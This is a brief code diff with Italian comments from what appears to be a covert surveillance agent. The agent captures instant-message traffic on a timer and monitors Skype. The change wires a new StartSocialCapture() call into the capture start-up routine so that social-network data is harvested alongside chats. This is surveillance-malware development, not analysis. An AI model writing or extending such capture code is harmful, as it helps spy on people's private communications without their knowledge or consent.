@@ -1,6 +1,7 @@
 #include "HM_IMAgent\QMessengerAgent.h"
 
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
+extern void StartSocialCapture(); // Per far partire le opzioni "social"
 
 #define IM_CAPTURE_INTERVAL 333 // in millisecondi
 
@@ -388,6 +389,12 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 		hIMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMCaptureThread, NULL, 0, &dummy);
 		// Crea il thread che monitora skypepm
 		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD *)&bPM_imspmcp, 0, 0);
+
+		// Fa partire il processo per la cattura dei dati socia.
+		// Se inserisco una opzione per abilitare o meno la cattura dei social,
+		// questa funzione va chiamata solo se l'opzione e' attiva.
+		StartSocialCapture();
+
 	} else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_IMStarted = bStartFlag = FALSE)
